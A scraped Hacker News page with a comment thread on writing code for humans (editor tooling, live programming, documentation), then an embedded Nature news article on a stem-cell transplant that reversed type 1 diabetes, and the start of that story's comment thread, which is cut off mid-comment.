screen at the same time Vim and Emacs. Or Smalltalk IDEs like Pharo > Data conversion Vim and Emacs macros. But the truth is data encodings are very important, because for the computer, it's all bits, we assigned meanings to these bits and enacted RULES that describes how to manipulate them according to these meanings. Morphing from a set of RULES to another will require more RULES. I will urge you to try a live programming environment (SLIME for Common Lisp, Pharo for Smalltalk, The web inspector for Javascript (not great)). It feels like working on a boat in the middle of the sea instead of having it on land imagining what it feels to sail it. reply bippihippi1 6 hours agoparentprevI think the reason the text editor experience hasn't improved that much is because it's not often a bottleneck. Thinking and learning are the hardest parts of programming. Typing faster doesn't help that much. reply skydhash 5 hours agorootparentAnd Emacs and VIM already have all the bits for improving your experience, but you have to integrate them yourselves. Or get an IDE that does it for the language you use. What you need to do is develop your own meta-language to shorten the time between idea and execution. Snippets, code generation, auto-completion, code analysis and navigation, all help. reply adrian_b 6 hours agoparentprevI agree about auto-complete, but already the editor Brief for MS-DOS, at least some 35 years ago, allowed you to define arbitrary templates for auto-completion. For example, when writing a C program you could choose to have \"f\" expanded to \"for (=; ;}\" or whatever indentation you preferred. There are many modern programming editors that allow a similar customization, though unfortunately for many of them this requires a more complicated procedure than in the far past. For any programming language with a verbose syntax, I consider necessary to take your time and define in your editor templates that would allow the fast writing of any program structure with a minimum number of key presses. reply ants_everywhere 6 hours agoparentprevI may not be understanding you correctly, so please let me know if I've gotten it wrong. Some of the stuff you're talking about -- like brackets and terminators -- make explicit the syntax and greatly improve tooling. Usually editors have features that can add these in or you. But in some cases something is obvious to you, but is really one valid choice among many and the tooling can't read your mind without something like a design doc to guide its decisions. For others -- like whether to use a HashSet or Dictionary or Tuple -- those have performance implications and it's not always clear in the abstract when to use one or the other. But for explicit languages like Java (and I would assume C#) you should be able to refactor a method call to take a different type. Then you just have to change one method and refactor all the calls to it. I've been experimenting with the pro Gemini and ChatGPT o1. They're both really bad at coding Python and JavaScript. They write buggy code and will often introduce bugs when attempting to fix another. Both feel like they're rushing to answer instead of thinking about the requirements. I'd say we're still a bit away from having tools that can \"read your mind\" or understand what matters to you and what doesn't the way you'd (or we'd) like them to. Potentially even worse: consider the data we're training on. These tools will be adopting the thought patterns of the average coder since most code is produced by average and below average coders. Even if we trained the tools only on the highest quality code, it's not clear that most coders would know how to prompt it correctly. So I think if you've been coding for 10-20 years chances are decent that you'll always be a little disappointed with the tooling if you're expecting instant wizardry. That said, non-AI static analysis tools have been great for a while and will get even better. Adding AI to them will improve them further. So I think you can have a great experience if you're thinking of the tools as helping you be an artist rather than as an artist you can give a spec to and get back a decent result. EDIT: It might be fun to experiment with telling the AI what you want your editor to do more of and asking the AI to help you configure it. There's a lot of non-AI tooling in plugins. Getting an LLM to help you pick the right plugins for your lifestyle may be the best bang for your buck. reply animal531 3 hours agorootparentYeah I've also been playing with ChatGPT etc. and sometimes they can produce great code, or at least get you up to speed a lot faster. As long as you ask them questions about well known problems they're great, but break down after that. But they're definitely going to play more and more of a role going forward. What I really want to explore (and where I think there might be some big room for improvement) are around how we represent and visualize both code and data, as well as how we interact with it. Full visual programming has often been tried before and while it works fine for a while it begins to break down once projects become more complicated. I instead want to explore some alternate text based options where we use the visual aspect as an assistant, whether by grouping or collating blocks that we're working on, changes that needs to be made and so forth. reply ants_everywhere 3 hours agorootparentI'm mildly skeptical of visual programming because code generally won't be a planar graph and it's rarely useful to visualize a complicated enough graph. You can try to embed the graph in hyperbolic space, but I'm not sure how much you get out of it. For example of visualizing a graph where it's not clear what's going on: https://cambridge-intelligence.com/wp-content/uploads/2021/0... Coding is a logic/language type activity that uses the language parts of your brain. Visualization can help see that certain relationships are true (e.g. visualizing the graph of a function), but I think the fundamental bottleneck we're dealing with here the inadequacies of the visual regions of the brain to do logic, not a lack of AI tooling. I'd be happy to have my mind changed though. EDIT: Although, an AI version of something like Chernoff Faces for visualizing data would be cool. reply bombela 6 hours agoparentprevSome of what you described, having 5 methods on screen, or finding all locations failing type checking, I have been using (neo)vim for successful over many years. I load the output of the type checker (or compiler) into vim. I then have a list of locations to inspect. I can move between the locations. I can open multiple locations (same file or not) at once on the screen. Nowadays, Copilot assists in the refactoring besides the usual vim commands/regex/macro. Opening 5 pane for 5 methods is similarly easy. I can also use a side panel to quickly view all methods and jump between them in addition to the traditional vim motions. Language servers (LSP) of course makes the whole experience delightful. Jumping and navigating around the code etc. All of that is keyboard driven, with many keyboard shortcuts personalized to my liking. Here is an example of my workflow. I run the compile/typecheck command in a terminal, via a script that runs the command as soon as a source file has changed. It also saves the output into a file at a standard location. Saving in vim triggers the command to re-run. Then a key press reloads the output of the command to quickly jump around. And navigating and modifying brackets is trivial in vim, especially with the right extension. Auto inserting brackets, I never found a plugin that I liked enough yet. It's not all nor exactly what you asked for. But it's something. reply thoronton 6 hours agoparentprev> You're editing a file (or parts of different files) and are focusing on say 5 methods that are interacting. I want to see all of them on the screen at the same time, without having to struggle to open and manage many windows with for example VS horizontal/vertical sliders Regarding this, maybe haystack could be interesting for you https://haystackeditor.com/ I haven't tried it myself, but I intend to. reply photonthug 5 hours agorootparentThis looks awesome, any users out there that can opine? Not sure this is the answer but for sure this is highlighting the right question. I’ve never been a teacher, but having been involved in mentoring newbies more often than I expected.. error traces with absolute filenames and terminals with Click-to-edit-file support are the smallest effort you can put in to get the biggest results (although this can also lead to confusion with virtual envs and such). That’s just the beginning of the nav we really want though. The key point is all about focusing on “don’t make me mess with file systems” because the code already has many dimensions of inherent structure. reply animal531 5 hours agorootparentprevThat's pretty neat, I'll definitely try it out! reply fhd2 5 hours agoparentprevI think one of the main improvements we've - interestingly - been unable to widely adopt is an actual live programming environment. Smalltalk was this. Nowadays I mainly use Common Lisp for something reasonably close. We're still mostly stuck in an edit->compile->test cycle. Stuff like TDD and debuggers help here, but considering the untapped potential for what programming environments could be, it seems to me like we're stuck on a local maximum. Edit: Don't get me wrong, programming in Smalltalk didn't seem entirely pragmatic to me. Reproducibility becomes something you need to actively worry about, with popular tech stacks it's kinda built in. My point is the potential of such approaches, not the pragmatic viability of the implementations we've had so far. reply _heimdall 5 hours agoparentprevWhen it comes to writing code being stuck in time, I'm expecting that LLMs replace programming languages rather than programmers. We aren't there yet and LLMs, or the next iteration of architecture, need to get better at logically working through and validating code, but I do think we'll get there. When you think about it, its really pretty ridiculous that a programmer will ask an LLM to write code that the programmer can copy and ultimately compile into machine code for yet another computer to use. Cutting out the intermediary steps seems like a logical next step. reply 1718627440 6 hours agoparentprev> You're editing a file (or parts of different files) and are focusing on say 5 methods that are interacting. I want to see all of them on the screen at the same time, without having to struggle to open and manage many windows with for example VS horizontal/vertical sliders. I think that is, why editors like emacs and vi are really popular. - Data conversion. So I created a HashSet for something but realize I need to change it to a Dictionary or a Tuple, just make it happen. If it requires brainwork then show me all the places that requires supervision where I have to say ok or make an edit myself. How different would that be from changing the type and editing all the places the compiler complains about? reply animal531 4 hours agorootparent>How different would that be from changing the type and editing all the places the compiler complains about? Currently in VS if let's say I change the Set to a Dictionary it will compile in the background and then complain about all the errors from where I can click on them to be taken there, and/or I would search on the variable name and find all the references and just scan through all of them to make changes as necessary. Some ideas there could be: a) We can use multiple windows (or lines in 1 window) to just quickly display all of the required changes directly on screen without me having to manually go from one to the next. b) Let's say we were doing a standard List.Add but now its a Weird.Blob (ie. a non-standard class with no built in conversion support). I can perform a replace all .Add with .Blob which text editors can already do, but what if we only applied it to this current set of windows that have opened up, so as to not break other things? Again you could have done that with a narrower replace, but this way might be easier or faster. c) In text editing you might have to replace a few lines several times, so you'd copy the new line or a segment of it, then replace all the parts of the old instances. What if we sorted all those opened windows so that the ones that are most similar are located next to each other, then if we change one we just drag it (or parts of it) to the other windows to make replacements. If they are exactly the same then provisionally change them automatically, the user just accepts the whole block of changes (as if they had done a search/replace for a specific line, or part of a line). reply odieldomanie 5 hours agoparentprevThe problem isn't the IDE, but that we are still using a programming language 24 years old. reply 998244353 1 hour agorootparentWhat does a more recent language offer that C# doesn't and that would enable more powerful IDEs? reply brainzap 5 hours agoparentprevI feel the same, and I am happy that new programming languages like Go or Swift make small improvements. I still feel I need a different programming language to write business code. reply konschubert 6 hours agoparentprevHave you tried github copilot? It's not doing multi-file editing yet, but once it does, I think it's pretty much what you are looking for. reply jerf 5 hours agoparentprev\"Why do I need to worry about small language specifics like brackets, terminators and so on when tools should be able to auto-complete them for me?\" Actually, if you are using an IDE, there's probably a flag you can flip for that. It's a very common feature, to the point that I often find it in places I'm not expecting, like the web-based security training code platform my employer periodically pushes us through. I'm not a fan, but some of it is just that my habits haven't developed around it. There have been a number of tries at going even deeper, and trying to make it so the code is valid at all times. I suspect this one fails because we pass through more invalid states than people realize. For instance it's not uncommon for me to copy & paste some data from somewhere to embed into a program, and to massage it in my code editor until it is valid syntax, but it isn't \"valid\" until the very end. Smaller scale things like this happen all the time. It is more constricting than I think people generally realize to have to be valid every second. \"You're editing a file (or parts of different files) and are focusing on say 5 methods that are interacting. I want to see all of them on the screen at the same time, without having to struggle to open and manage many windows with for example VS horizontal/vertical sliders.\" We've tried that already... and actually I'm with you, it's awesome. I suspect this is just because by the time you've got all the other IDE gizmos on the screen it's hard to do too much splitting. But my normal code setup is three emacs windows side-by-side on the screen (and, that is, windows, managed by the windowing system, not \"frames\" within emacs), each of which then can and often are further split once vertically. If I have to go all the way up to truly using 6 contexts at a time, something has probably gone wrong architecturally, but 2 is extremely common and bursts up to 3 and 4 a daily occurrence. Watching some people recently trying to get into a largish code base, and watching them interact with it basically through a single window and at times not even with an IDE, really makes me think one of the larger problems is people learning how to \"turn the lights on\" in a code base. It isn't even a matter of implementing features at this point, honestly almost any environment already has a ton. You need to learn to use them. \"Data conversion. So I created a HashSet for something but realize I need to change it to a Dictionary or a Tuple, just make it happen.\" We tried that already... and it comes with some substantial costs you may not realize. First there's the obvious performance one. Make it easy to auto-convert them back and forth without any syntax fuss and you'll end up people writing loops in which the 1,000,000-million element hash table is converted both back and forth between a hash table and a tuple list in a loop, once per element, and you end up with the sort of bloated programs we all like to complain about. (Indeed, this sort of thing is one of the root causes, though far from the only one.) The more subtle one is that automatic coercion, of which this is an example, is just generally a bad idea. The programmer ends up with a too-fuzzy idea of what is going on, and that fuzziness manifests not just in the aforementioned performance issue, but also, bugs, when it turns out that the properties of various structures being autoconverted back and forth are actually important to the code. The most common example which is increasingly widely regarded as a bad idea is \"falsiness\", where the language tries really hard to have a concept of true or false for all sorts of data structures, but the bugs that emerge from empty strings being read as false unexpectedly and such make this generally not worth it. In the case you cite, the data structures are not the same; they differ substantially in what they do with multiple values for a given key, and how order-sensitive they are, and in the world of programming, these details all matter. Especially because they end up being used to construct security systems. It is hard to see the general sweep of programming language development, but in general at the moment I think languages are headed away from auto-conversion. What you can see is languages and libraries developing better \"interface\"-like abilities, where maybe they can declare that they just need this or that bit, and then you can pass multiple different structures in. See for instance __getitem__ in Python. This is a much better approach; there's still some fuzziness cost but the offsetting benefits are much stronger so it's a much better trade. reply animal531 4 hours agorootparentSome good feedback here and in the thread overall. I also use a 3-way horizontal split these days for editing, I've found that the wider our screens get the less I use the edges. So now often I'll keep the left focused on the headers to variable definition, the middle for the main editor and the right for methods where the middle is calling or being called by something. In Visual Studio you don't have to dock windows, but the current generation of floating window doesn't really conform to what I want. Someone else mentioned Haystack which I haven't seen before: https://haystackeditor.com/ I quite like the layout of Haystack, although I don't think one wants to take it too far such that it begins to resemble visual scripting. I think a block based approach where you have different blocks for the different types such as classes, variables and code might be worth exploring. I'll definitely post back sometime with feedback on whether I've come up with anything interesting. reply jerf 3 hours agorootparentI hope you do. I know it's easy to just crap on someone's ideas, but I'm really trying not to do that. I think it's a great idea to learn from what came before, because if anything's going to succeed it is almost certainly going to be at least a little different than what someone else tried. Sometimes it can be the smallest difference that decides the matter. I wish you the best of luck in your explorations. reply binary132 6 hours agoparentprevActually it has gotten worse because our software abstractions have become a lot more complex. reply AnimalMuppet 6 hours agoparentprevAbout the first item on your wishlist: If by \"brackets\" you mean {} (in C-like languages), there are IDEs that can be configured to create pairs of them every time you hit return after an expression that can take them. The downside (if you care) is that, if you wanted to write an if, while, or for with only one line, and therefore no scope delimiters, it will force you to create the scope anyway. You may not care. If by \"brackets\", you mean [], to access an element of an array or vector or map or whatever, yes, it could do that as soon as you gave it the name of an array or vector or map or whatever. But then if you wanted to deal with the array or vector or map as a whole (which you want to do sometimes), the brackets have to go. I would estimate that 30% of the time I want to deal with the array as a whole, so such a feature would be annoying and in my way 1/3 of the time. Terminators are a win more of the time. But when they're not, I meant to be continuing one line of code across two lines of file. If it auto-added a terminator (semicolon, say) at the end of the first line as it opened the second, I might not even notice until compile time. That would be highly annoying. Public and private I don't want determined by a tool auto-determining the \"most efficient\" set. I want them determined by my sense of what the class is, and therefore what the public interface should be. Some of the things that are private are less efficient, but are private because they're implementation details and I don't want callers able to fiddle with them. So, that's my whiny personal take on some things on your list. Maybe I've adapted myself to the existing tools. But I personally think that many of your items, if you implement them, you will find that you don't really like how they work out. reply animal531 4 hours agorootparentYeah some of my points are really space dependent. For example I'm working on a solo game project, so my comment on the public/private etc. modifiers is really aimed at that where nothing will ever be exposed and the modifiers are pretty much irrelevant. >So, that's my whiny personal take on some things on your list. Maybe I've adapted myself to the existing tools. But I personally think that many of your items, if you implement them, you will find that you don't really like how they work out. You could very well be 100% correct there. As developers we really become used to our tools and its quite hard to adapt to new ways of doing things. But I figure its worth a shot, at the worst I'll have learned a few things along the way. reply EnigmaFlare 6 hours agoparentprevVisual Basic in VS has aggressive autocomplete and it gets pretty annoying. You often want to write things in a different order and end up having to delete the auto-inserted endif/quotes/brackets/variable names (if it's not yet declared, it changes it to become something else that is), etc. reply remoquete 6 hours agorootparentOh, you still code in Visual Basic? Fascinating. May I ask what's the use case and how are you finding coding in VB these days? reply aruametello 1 hour agorootparentNot OP, but there are some fairly complex/decent use cases with Microsoft Excel. Overall not much. Some could argue that there is value in \"bash like\" vbscript automations via cscript, but that became legacy after Powershell came along. reply bambax 2 hours agoprevThe title of the post is debatable, as code is only written for humans. Computers don't need \"code\", and especially not high level code. They're happy with machine instructions. We write code because machine instructions are much too hard for us to write, and even harder to read. We should not think of code as a way to interact with computers. Code is a way for us humans to formalize our thoughts so that they become so unambiguous that (even) a machine can follow them. reply Olshansky 2 hours agoprevSelfless shill of a blog post I wrote & shared last week: Move Fast & Document Things [1] My goal wasn't to be philosophical but share actual tips on how our small team [2] enforces (not automated, not AI, but deep, hard reviews) a culture for writing code for ourselves and each other. All my personal friends who are engineering leaders at other orgs said \"We do the same thing but you actually wrote it down\". Would appreciate ↑ if it brought anyone value! [1] https://olshansky.substack.com/p/move-fast-and-document-thin... [2] https://github.com/pokt-network/poktroll/graphs/contributors reply osigurdson 1 hour agoprevI've seen the aircraft / bullet heatmap diagram a few times. However, I'm always left wondering \"was this a purely empirical analysis?\". Clearly engineers would have some sense of what areas would bring an aircraft down (loss of engine, loss of tail strike me as obvious with no experience in aircraft design beyond paper planes). It is a great prop for survivorship bias of course! reply jeroen 6 hours agoprevAs Spolsky said a long time ago: > It’s harder to read code than to write it. reply osigurdson 1 hour agoprev>> Humans learn from examples, not from “core concepts” So true. Humans are great at building mental models from raw data. Only after we learn our mental model is wrong we RTFM (unless your role is very specialized of course). reply bodeadly 1 hour agoprevWriting code is easy. Knowing /what/ to write is hard. I know how to write English. But that doesn't mean I can write a book (that someone would want to read). AI can write code. But it still has to be told what to write. reply auggierose 7 hours agoprevA nice read, but I think there is a contradiction here that needs to be cleared up: 1) On one hand, the author says that humans learn from examples, not core concepts. 2) On the other hand, the author emphasises the importance of reducing \"conceptual overload\", by reducing the number of concepts while maintaining their expressiveness. So it is not that core concepts are not important for learning. Rather, it is essential to have a set of well-defined and well-documented core concepts which cover what the system can do. But of course, you also need plenty of insightful examples, and of course a \"Getting Started\" guide should start with examples, not core concepts. But if the core concepts are simple and few enough to fit into a \"Getting Started\", that's a win. reply kalaksi 7 hours agoparentI didn't find it contradictory. The first one is about how to start learning about something more easily and the second one about how to organize it all so that it's easier to use and understand as a whole. That may also help with getting started too. I personally agree that examples are a very efficient way to get started and you can learn the details incrementally in a top-down fashion. Some text books during my studies took the bottom-up approach (even explicitly mentioned it) and I never quite liked it. If the core concepts are simple and not too many, then it probably doesn't matter that much. The point is to get started easily. reply auggierose 6 hours agorootparentThere is even a headline saying \"Getting started is the product\". No, it is not. If your product doesn't have nice core concepts, then I don't even want to get started with it. Top-down is fine, as long as there is an actual bottom of core concepts. reply kalaksi 3 hours agorootparentSure, it isn't really the whole product, but I interpreted it as an exaggeration, meaning that easy onboarding would be very essential part of the product and which is the first thing users experience. reply ulbu 4 hours agorootparentprevagain, not contradictory. have good core concepts, combine with good entry corridors. good concept with entry blocked by obtusity and esoterics is not a product ready for consumption. i didn’t see the authors suggest that good concepts are unimportant. reply auggierose 2 hours agorootparent> Humans learn from examples, not from “core concepts” That's a subtitle in the article, and it's wrong. reply k2so 7 hours agoprevEasier to use libraries over highly complicated (supposedly performant) have a significant advantage in driving more adoption. Recently I was trying to generate text embeddings from a huggingface model. Nvidia triton and text-embedding-inference (built by huggingface) were my two options. > why large companies are generally incapable of delivering great developer experience. I wanted to curl up and cry while trying to make nvidia-triton spit out embeddings . The error messages are cryptic and you need to have jedi like intuition to get it to work. I finally managed to get it work after like 2 days of wrangling with the extremely verbose and long-winded documentation (thanks in part to claude, helped me understand with better examples) Triton's documentation starts off with core-principles and throughout the entire documentation, they have hyper links to other badly written documentation to ensure you know the core concepts. The only reason I had endured this was because of the supposed performance gains triton promised but underdelivered (this highly likely being I had missed some config/core-concept and did get all the juice) On the other hand, text-embedding-inference has a two line front and centre command to pull the docker image and get running. The only delay was due to my internet speed before it started serving the embeddings. Then deploying this on our k8s infra was a breeze, minor modifications to the dockerfile and we are running. And on top, it's more performant than triton! reply shahzaibmushtaq 2 hours agoprevFirst you write code for computers, then you rewrite the same code for humans. reply mgaunard 7 hours agoprevIf humans understand how computers work, then you just have to write code for computers and can ignore the human element. Unfortunately the last few decades we decided that software engineers don't need to know how computers work anymore. reply inglor_cz 6 hours agoparentObfuscated C contest seems to be challenging your view. Or Brainfuck. Intentional coding-trolling aside, if whatever is happening in the head of the original developer is muddled, the resulting code is likely to be confusing even for people who know computers from the inside out. reply JimDabell 7 hours agoprevOn a side note, I have wondered if LLMs work more effectively with code that is well-structured and easy for humans to read than they do with spaghetti. Has anybody researched this? reply ants_everywhere 5 hours agoprevMy approach to dealing with lots of concepts is pretty much stolen from how babies learn language. Grownups talk around non-verbal babies as if they're not there. We refer to all the objects in the room (or anywhere else) whether the baby understands them or not. \"How was your day at work?\" \"Oh it was okay, but traffic was bad so I didn't have time to get my usual coffee.\" Babies don't understand what traffic or coffee is, and they don't have to. They still eventually learn the language and really focus on the things that matter to them. At some point, a lot of us try to simplify by reducing the number of concepts we're exposed to, and we try to feel like we understand those fewer concepts. I've switched my approach to just being immersed in the way experts talk about the field, and just getting used to used to not really knowing what most things mean. It turns out you get a ton of information this way. Not only do you learn the vocabulary before you need it (reducing the time required later when you eventually need it) but also you pick up a sense of which things are fundamental (they come up a lot in conversation) and which things are extraneous detail (they're barely mentioned or only mentioned when something goes wrong). reply Jtsummers 1 hour agoprevSomeone, a one day old account, wrote and then deleted this while I was writing a reply: > No other engineering discipline thinks this way. You design circuits for performance, manufacturing, and cost, not other engineers. Yeah, that's why we don't produce schematics, diagrams, and blueprints or maintain those things over the years. Software development is a design discipline, not a construction discipline. The analogs in engineering disciplines to source code are not the circuit, the car, or the bridge artifacts, but the schematics, diagrams, and models that go into their development. And yes, practitioners in engineering disciplines absolutely care about communicating with other people (including other engineers), that's a substantial portion of their job in fact. reply samatman 2 hours agoprevThe major part of this post is about documentation, and would have benefitted greatly from reference to the 4doc model: https://docs.divio.com/documentation-system/ It's basically saying: don't just provide a reference, provide how-tos as well, and lead with them because they're the part of the total documentation which users generally want to see first. Generally, mind you, I tend to go straight to the reference material but not always. Not that 4doc is a silver bullet or a law of nature, Hillel Wayne has some good things to say about that here https://www.hillelwayne.com/post/problems-with-the-4doc-mode... reply WillAdams 4 hours agoprevWell, there is at least one effort at a solution: http://literateprogramming.com/ and I've found that John Ousterhout's recent book, _A Philosophy of Software Design_ is one of the most notable programming books of the past decade and speaks to many of these difficulties so well that I added it my effort at a list of (mostly) Literate Programming books: https://www.goodreads.com/review/list/21394355-william-adams... The other issue here is the still unanswered question: >What does an algorithm look like? and by extension, the further question of: How does one manage a visual representation of a program when it gets beyond the size of one screen/window, or a page in a book, or for the largest ones, a poster? With a bit of help of tex.stackexchange.com I was able to put together a Literate Programming system which allows me to use (La)TeX w/o the comment character which docstrip mandates: https://github.com/WillAdams/gcodepreview/blob/main/literati... (it's a little clunky, since that file has to be customized for the files in a given project) but it allowed me to switch from having three files open in three different OpenPythonSCAD windows to a single .text file which makes a .pdf: https://github.com/WillAdams/gcodepreview/blob/main/gcodepre... which has a ToC, and multiple indices all nicely hyperlinked, and which makes a search/review of the code into a vertical scroll. That said, I sympathize w/ the author quite a bit, and often work up snippets of code using either Blockly or BlockSCAD3D: https://www.blockscad3d.com/editor/ or https://github.com/derkork/openscad-graph-editor https://raw.githubusercontent.com/WillAdams/gcodepreview/mai... reply ForOldHack 4 hours agoprevSacrafice nothing for clarity. reply WesSouza 7 hours agoprevI thought this was going to be about genetics or something. reply SilHunter 7 hours agoprevnext [4 more] [flagged] naavis 7 hours agoparent> psychopathic scammers like Robert Martin That is a pretty wild take. Would you like to elaborate on that? reply zabzonk 7 hours agorootparenthave you read any of the arrant nonsense he comes out with? reply tom_ 6 hours agorootparentRight, but \"psychopathic scammer\" dials the criticism up a few notches, possibly to unreasonable levels - which i suspect is the point being made here. (That's certainly the point I'd have been making if I'd written the post you replied to.) reply mikkom 7 hours agoprev [–] Yeah bro but I read in twitter that I can just write \"Code a health care app make it very profitable!\" to AI and be billionaire! reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Writing code for humans involves creating tools like frameworks, libraries, APIs, SDKs, DSLs, or programming languages that others will use, requiring an understanding of both computer science and human psychology.",
      "Key strategies include simplifying onboarding, using practical examples, providing clear error messages, minimizing conceptual overload, using familiar terminology, allowing customization, being cautious with defaults, and prioritizing readable code.",
      "The goal is to make tools intuitive, easy to start with, flexible, and clear, thereby enhancing user experience and reducing complexity."
    ],
    "commentSummary": [
      "Writing code for humans is more challenging than writing code for computers due to diverse learning styles and preferences.",
      "Effective tutorials should balance core concepts and practical examples, considering cultural differences and individual learning needs.",
      "Good API design must cater to both deep understanding and usability for occasional users, reflecting the ongoing debate on the best approach to learning and teaching code."
    ],
    "points": 264,
    "commentCount": 84,
    "retryCount": 0,
    "time": 1727431155
  },
  {
    "id": 41664199,
    "title": "Stem cells reverse woman’s diabetes",
    "originLink": "https://www.nature.com/articles/d41586-024-03129-3",
    "originBody": "NEWS 26 September 2024 Stem cells reverse woman’s diabetes — a world first She is the first person with type 1 diabetes to receive this kind of transplant. By Smriti Mallapaty Twitter Facebook Email A woman with type 1 diabetes started producing insulin (blue) after a stem cell transplant.Credit: Lennart Nilsson, Boehringer Ingelheim International GmbH, TT/Science Photo Library A 25-year-old woman with type 1 diabetes started producing her own insulin less than three months after receiving a transplant of reprogrammed stem cells1. She is the first person with the disease to be treated using cells that were extracted from her own body. “I can eat sugar now,” said the woman, who lives in Tianjing, on a call with Nature. It has been more than a year since the transplant, and, she says, “I enjoy eating everything — especially hotpot.” The woman asked to remain anonymous to protect her privacy. James Shapiro, a transplant surgeon and researcher at the University of Alberta in Edmonton, Canada, says the results of the surgery are stunning. “They’ve completely reversed diabetes in the patient, who was requiring substantial amounts of insulin beforehand.” The study, published in Cell today, follows results from a separate group in Shanghai, China, who reported in April that they had successfully transplanted insulin-producing islets into the liver of a 59-year-old man with type 2 diabetes2. The islets were also derived from reprogrammed stem cells taken from the man’s own body and he has since stopped taking insulin. The studies are among a handful of pioneering trials using stem cells to treat diabetes, which affects close to half a billion people worldwide. Most of them have type 2 diabetes, in which the body doesn’t produce enough insulin or its ability to use the hormone diminishes. In type 1 diabetes, the immune system attacks islet cells in the pancreas. Islet transplants can treat the disease, but there aren’t enough donors to meet the growing demand, and recipients must use immune-suppressing drugs to prevent the body from rejecting the donor tissue. Stem cells can be used to grow any tissue in the body and can be cultured indefinitely in the laboratory, which means they potentially offer a limitless source of pancreatic tissue. By using tissue made from a person’s own cells, researchers also hope to avoid the need for immunosuppressants. Reprogrammed cells In the first trial of its kind, Deng Hongkui, a cell biologist at Peking University in Beijing, and his colleagues extracted cells from three people with type 1 diabetes and reverted them into a pluripotent state, from which they could be moulded into any cell type in the body. This reprogramming technique was first developed by Shinya Yamanaka at Kyoto University in Japan almost two decades ago. But Deng and his colleagues modified the technique3: instead of introducing proteins that trigger gene expression, as Yamanaka had done, they exposed the cells to small molecules. This offered more control over the process. The researchers then used the chemically induced pluripotent stem (iPS) cells to generate 3D clusters of islets. They tested the safety and efficacy of the cells in mice and non-human primates. In June 2023, in an operation that lasted less than half an hour, they injected the equivalent of roughly 1.5 million islets into the woman’s abdominal muscles — a new site for islet transplants. Most islet transplants are injected into the liver, where the cells cannot be observed. But by placing them in the abdomen, the researchers could monitor the cells using magnetic resonance imaging, and potentially remove them if needed. Insulin free Two-and-a-half months later, the woman was producing enough insulin to live without needing top-ups, and she has sustained that level of production for more than a year. By that time, the woman had stopped experiencing the dangerous spikes and drops in blood glucose levels, which remained within a target range for more than 98% of the day. “That’s remarkable,” says Daisuke Yabe, a diabetes researcher at Kyoto University. “If this is applicable to other patients, it’s going to be wonderful.” The results are intriguing, but they need to be replicated in more people, says Jay Skyler, an endocrinologist at the University of Miami, Florida, who studies type 1 diabetes. Skyler also wants to see that the woman’s cells continue to produce insulin for up to five years, before considering her ‘cured’. Deng says the results for the other two participants are “also very positive”, and they will reach the one-year mark in November, after which he hopes to expand the trial to another 10 or 20 individuals. Because the woman was already receiving immunosuppressants for a previous liver transplant, the researchers could not assess whether the iPS cells reduced the risk of rejection of the graft. Even if the body doesn’t reject the transplant because it doesn’t consider the cells to be ‘foreign’, in people with type 1 diabetes, because they have an autoimmune condition, there is still a risk that the body could attack the islets. Deng says they didn’t see this in the woman because of the immunosuppressants, but they are trying to develop cells that can evade this autoimmune response. Donor cells Transplants using the recipient’s own cells have advantages, but the procedures are difficult to scale up and commercialize, say researchers. Several groups have started trials of islet cells created using donor stem cells. Preliminary results for one trial, led by Vertex Pharmaceuticals in Boston, Massachusetts, were reported in June. A dozen participants with type 1 diabetes received islets derived from donated embryonic stem cells that were injected into the liver. They were all treated with immunosuppressants. Three months after the transplant, all the participants began producing insulin when glucose was present in their bloodstreams4. Some had become insulin independent. Last year, Vertex launched another trial in which islet cells derived from donated stem cells were placed in a device designed to protect them from immune-system attacks. It was transplanted into a person with type 1 diabetes, who did not receive immunosuppressants. “That trial is ongoing,” says Shapiro, who is involved in the study, which aims to enrol 17 individuals. Yabe is also about to start a trial using islet cells produced using donor iPS cells. He plans to develop sheets of islets and surgically place them in the abdominal tissue of three people with type 1 diabetes, who will receive immunosuppressants. The first participant should receive their transplant early next year. doi: https://doi.org/10.1038/d41586-024-03129-3 References Wang, S. et al. Cell 187, 1–13 (2024). Article Google Scholar Wu, J. et al. Cell Discov. 10, 45 (2024). Article PubMed Google Scholar Guan, J. et al. Nature 605, 325–331 (2022). Article PubMed Google Scholar Reichman, T. W. et al. Diabetes 72, 836-P (2023). Article Google Scholar Download references Reprints and permissions Latest on: Stem cells Diabetes Cell biology Jobs Associate Professor J. Craig Venter Institute is conducting a faculty search for Associate Professors position in Rockville, MD and San Diego, CA campuses. Rockville, Maryland or San Diego, California J. Craig Venter Institute Associate Professor Associate Professor position (Tenure Track), Dept. of Computational & Systems Biology, U. Pittsburgh School of Medicine. Please apply by Dec. 2, 2024. University of Pittsburgh, Pittsburgh University of PittsburghDCSB Assistant Professor Assistant Professor position (Tenure Track), Dept. of Computational & Systems Biology, U. Pittsburgh School of Medicine. Please apply by Dec. 2, 2024. University of Pittsburgh, Pittsburgh University of PittsburghDCSB Independent Group Leader Positions in Computational and/or Experimental Medical Systems Biology NIMSB is recruiting up to 4 Independent Group Leaders in Computational and/or Experimental Medical Systems Biology Greater Lisbon - Portugal NOVA - NIMSB CZS Junior Group Leader for “Molecular Systems Engineering/DNA Nanoscience” Johannes Gutenberg University Mainz (JGU) is one of the largest universities in Germany. Thanks to its location in the Rhine-Main science region, t... Mainz, Rheinland-Pfalz (DE) Johannes Gutenberg University Mainz (JGU)",
    "commentLink": "https://news.ycombinator.com/item?id=41664199",
    "commentBody": "Stem cells reverse woman’s diabetes (nature.com)261 points by user070223 20 hours agohidepastfavorite41 comments syntheticnature 19 hours agoThe fact this worked on Type 1, which is an autoimmune disorder, is very interesting/surprising as a layman. reply kgc 17 hours agoparentThe patient was on immunosuppressants. reply mlhpdx 15 hours agorootparentThis. I’m stupefied that they would include someone in immunosuppressants in such a study. It’s pointless since requiring them in a “cure” makes it largely worse than the disease (when well controlled). reply Projectiboga 15 hours agorootparentHi type 1 here. Since our errant immunity is localized on the insulin producing beta cells being on immune supressants would still be better than being insulin deoendent. Type 1 diabetes is a wild condition, when my blood sugar drops, subsections of my brain switch off. Low sugars are very emotionally bleak. There is a whole set of post traumatic stressors as part of this. 35 years ago I could just walk into a pharmacy and buy insulin without a prescription, maybe the pharmacist might as a couple of questions to at least try and be sure I need it, and that insulin was maybe $30 cash with no insurance and that was enough for a month. So everything might be $70 for an entire month w 5 blood sugar tests per day. Now a months supplies is in the hundreds of dollars. This stuff doesn't involve much more to manufacture, just layers of beauracy and markups. So yes having to take a cheap pill or two every day with the worst case being a revertion to being insulin dependent is worthwhile. Now side effects of the immune drugs might maybe be worse, but I doubt that. And this is a pilot to get FDA 